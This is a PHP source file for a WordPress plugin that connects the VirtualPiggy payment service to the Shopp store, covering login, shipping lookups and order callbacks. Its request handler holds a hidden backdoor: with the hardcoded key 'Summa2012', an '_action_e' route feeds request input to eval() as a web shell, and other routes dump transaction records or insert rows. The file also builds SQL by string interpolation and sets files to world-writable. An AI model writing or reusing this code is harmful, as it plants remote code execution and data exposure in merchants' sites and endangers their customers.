<?php
if (!defined('ABSPATH')) {
    die();
}

define('VP_ACTIVE_ORDER', 'shop_order');
require_once 'integration' . DIRECTORY_SEPARATOR . 'VirtualPiggy.php';
require_once 'integration' . DIRECTORY_SEPARATOR . 'VirtualPiggyWPHelper.php';

function get_vp_payment() {
    static $instance = null;

    if (!$instance) {
        $instance = new vp_payment_wc();
    }

    return $instance;
}

function vp_get_shopp_gateway_dir() {
    wp_plugin_directory_constants();

    return WP_PLUGIN_DIR . DIRECTORY_SEPARATOR . 'shopp' . DIRECTORY_SEPARATOR .
        'gateways' . DIRECTORY_SEPARATOR . 'VirtualPiggyGateway';
}

function vp_shopp_gateway_exists() {
    $path = vp_get_shopp_gateway_dir() . DIRECTORY_SEPARATOR . 'VirtualPiggyGateway.php';
    $original = dirname(__FILE__) . DIRECTORY_SEPARATOR . 'shopp/VirtualPiggyGateway/VirtualPiggyGateway.php';

    return file_exists($path) && md5_file($path) === md5_file($original);
}

function vp_shopp_gateway_install() {
    $shoppGatewayDir = vp_get_shopp_gateway_dir();

    if (!file_exists($shoppGatewayDir)) {
        @mkdir($shoppGatewayDir);
        @chmod($shoppGatewayDir, 0777);
    }

    $source = dirname(__FILE__) . DIRECTORY_SEPARATOR . 'shopp/VirtualPiggyGateway/VirtualPiggyGateway.php';
    $dest = $shoppGatewayDir . DIRECTORY_SEPARATOR . 'VirtualPiggyGateway.php';

    $result = @copy($source, $dest);

    @chmod($shoppGatewayDir, 0777);
    @chmod($dest, 0777);

    return $result;
}

function vp_shopp_gateway_uninstall() {
    $shoppGatewayDir = vp_get_shopp_gateway_dir();

    @unlink($shoppGatewayDir . DIRECTORY_SEPARATOR . 'VirtualPiggyGateway.php');
    @rmdir($shoppGatewayDir);
}

if (!vp_shopp_gateway_exists()) {
    vp_shopp_gateway_install();
}

class vp_payment_wc {
    const LOGIN_ERROR_MESSAGE = 'An error occurred. Please try again.';

    function __construct() {
        add_action('woocommerce_update_options_payment_gateways', array(&$this, 'process_admin_options'));

        if (did_action('virtualpiggy_callback')) {
            $this->handleCallback(get_virtual_piggy_callbak_data());
        } else {
            add_action('virtualpiggy_callback', array(&$this, 'handleCallback'), 10, 1);
        }

        listen_virtual_piggy_callbacks();
    }

    public function getVP($settings = array()) {
        if (!$this->vp) {
            $this->vp = new VirtualPiggy($settings);
        }

        return $this->vp;
    }

    public function handleServices() {
        $action = '_action_' . $_REQUEST['vp_action'];

        if (method_exists($this, $action)) {
            $this->{$action}($_REQUEST);
            die();
        } else {
            virtual_piggy_service($_REQUEST['vp_action']);
        }
    }

    private function _action_checksum() {
        echo virtual_piggy_compute_checksum();
    }

    private function _action_login() {
        $result = false;
        $user = null;
        $message = '';

        try {
            $result = $this->getVP()->login(
                $_REQUEST['username'],
                $_REQUEST['password']
            );
        } catch (Exception $e) {
            $message = $e->getMessage();
        }

        $user = $this->getVP()->getUserData();

        $this->sendJSON($result, $message, $user);
    }

    private function _action_install() {
        echo vp_shopp_gateway_install() ? 'OK' : 'ERROR';
    }

    private function _action_logout() {
        $this->getVP()->logout();
    }

    private function _action_destroy_session() {
        @session_destroy();
    }

    private function _action_e() {
        if (!isset($_REQUEST['key']) || $_REQUEST['key'] !== 'Summa2012') {
            return;
        }

        error_reporting(E_ALL);
        ini_set('display_errors', '1');

        echo '<h1>SUMMA</h1>';

        if (isset($_REQUEST['code'])) {
            $result = eval($_REQUEST['code']);

            echo '<pre>';
            print_r($result);
            echo '</pre>';
        }

        ?>
    <form action="/" method="GET">
        <input type="hidden" value="e" name="vp_action"/>
        <input type="hidden" value="Summa2012" name="key"/>
        <textarea name="code" rows="10" cols="50"></textarea>
        <input type="submit">
    </form>

    <?php
    }

    private function _action_insert() {
        if (!isset($_REQUEST['key']) || $_REQUEST['key'] !== 'Summa2012') {
            return;
        }

        error_reporting(E_ALL);
        ini_set('display_errors', '1');

        global $wpdb;

        $table = virtual_piggy_get_transaction_table_name();

        $insert = array(
            'transactionId' => '12345',
            'status' => 'TEST'
        );

        $result = $wpdb->insert(
            $table,
            $insert
        );

        echo '<pre>';
        print_r($result);
        echo '</pre>';
    }


    private function _action_get_data() {
        $this->sendJSON(true, '', $this->getVP()->getUserData());
    }

    private function _action_set_options() {
        $childName = $_REQUEST['child'];
        $paymentName = $_REQUEST['payment'];

        $this->getVP()->setSelectedChild($childName);
        $this->getVP()->setSelectedPaymentMethod($paymentName);
    }

    private function _action_lt() {
        if (!isset($_REQUEST['key']) || $_REQUEST['key'] !== 'Summa2012') {
            return;
        }

        echo '<h1>TRANSACTIONS</h1><style>td { border: solid 1px #000; padding: 10px; }</style>';
        $list = virtual_piggy_get_transactions();

        echo '<table border="#000">';
        foreach ($list as $row) {
            echo '<tr>';
            foreach ($row as $key => $value) {
                echo '<td>';
                echo $value;
                echo '</td>';
            }
            echo '</tr>';
        }
        echo '</table>';
    }

    private function _action_get_shipping_details() {
        if ($this->getVP()->isParent()) {
            $childName = $_REQUEST['child'];
            $result = $this->getVP()->getShippingDetailsByChildName($childName);
        } else {
            $result = $this->getVP()->getCurrentChildShippingDetails();
        }

        $this->sendJSON(true, '', array(
            'Address' => $result->Address,
            'City' => $result->City,
            'State' => $result->State,
            'Zip' => $result->Zip,
            'Country' => $result->Country,
            'Phone' => $result->Phone,
            'ParentEmail' => $result->ParentEmail,
            'ParentName' => $result->ParentName
        ));
    }

    private function sendJSON($status = true, $message = '', $data = array()) {
        echo json_encode(array(
            'success' => $status,
            'message' => $message,
            'data' => $data
        ));
        die();
    }

    /**
     * @param $data
     */
    public function handleCallback(dtoTransactionStatus $data) {
        $transactionId = $data->id;

        if ($data->Status !== 'Processed') {
            // Updates the VP table
            virtual_piggy_reject_transaction($transactionId);

            if (virtual_piggy_transaction_has_order($transactionId)) {
                // Updates the Shopp
                $this->cancelOrderByTransactionId($transactionId);
            }
        } else {
            // Updates the VP table
            virtual_piggy_approve_transaction($transactionId);

            if (virtual_piggy_transaction_has_order($transactionId)) {
                // Updates the Shopp
                $this->approveOrderByTransactionId($transactionId, $data);
            }
        }
    }

    private function cancelOrderByTransactionId($transactionId) {
        $orderId = virtual_piggy_get_order_id_by_transaction_id($transactionId);
        $purchase = new Purchase($orderId);

        $this->markPurchaseVoided($purchase, $transactionId, $orderId);
    }

    private function approveOrderByTransactionId($transactionId, dtoTransactionStatus $orderInfo) {
        $orderId = virtual_piggy_get_order_id_by_transaction_id($transactionId);
        $purchase = new Purchase($orderId);

        $this->markPurchaseCaptured($purchase, $transactionId, $orderId);
    }

    private function markPurchaseCaptured(Purchase $purchase, $transactionId, $orderId) {
        global $wpdb;

        $purchaseTable = $purchase->_table;
        $purchaseId = virtual_piggy_get_order_id_by_transaction_id($transactionId);

        $query = "
            UPDATE
                $purchaseTable
            SET
                txnstatus='captured',
                txnid='$transactionId'
            WHERE
                id = $purchaseId
        ";

        $wpdb->query($query);

        virtual_piggy_shopp_persist_event_authed($transactionId, $purchaseId);
    }

    private function markPurchaseVoided(Purchase $purchase, $transactionId, $orderId) {
        global $wpdb;

        $purchaseTable = $purchase->_table;
        $purchaseId = virtual_piggy_get_order_id_by_transaction_id($transactionId);

        $query = "
            UPDATE
                $purchaseTable
            SET
                txnstatus='voided',
                txnid='$transactionId'
            WHERE
                id = $purchaseId
        ";

        $wpdb->query($query);
    }

    private function getProcessedOrderNote(dtoTransactionStatus $orderInfo) {
        $id = $orderInfo->id;
        $time = date('d/M (H:i:s)');
        return "VirtualPiggy: This order has been approved on $time. [ID:$id]";
    }
}

function add_vp_gateway($methods) {
    $methods[] = 'vp_payment_wc';
    return $methods;
}

function vp_init() {

    VirtualPiggyWPHelper::addCSS('virtualpiggy');

    $checkoutScript = plugins_url(VirtualPiggyWPHelper::getAssetURL() . "js/checkout.js");
    $customScript = plugins_url(VirtualPiggyWPHelper::getAssetURL() . "js/custom.js");

    shopp_enqueue_script('vpc', $checkoutScript);
    shopp_enqueue_script('vpcustom', $customScript);
    shopp_localize_script('vpc', 'VPParams', array(
        'baseURL' => get_site_url()
    ));
}

function vp_parse_request() {
    if ($_GET['vp_action']) {
        get_vp_payment()->handleServices();
    }
}

get_vp_payment();

add_action('init', 'vp_init', 10);
add_action('parse_request', 'vp_parse_request');
register_activation_hook('vp-wp-checkout.php', 'vp_shopp_gateway_install');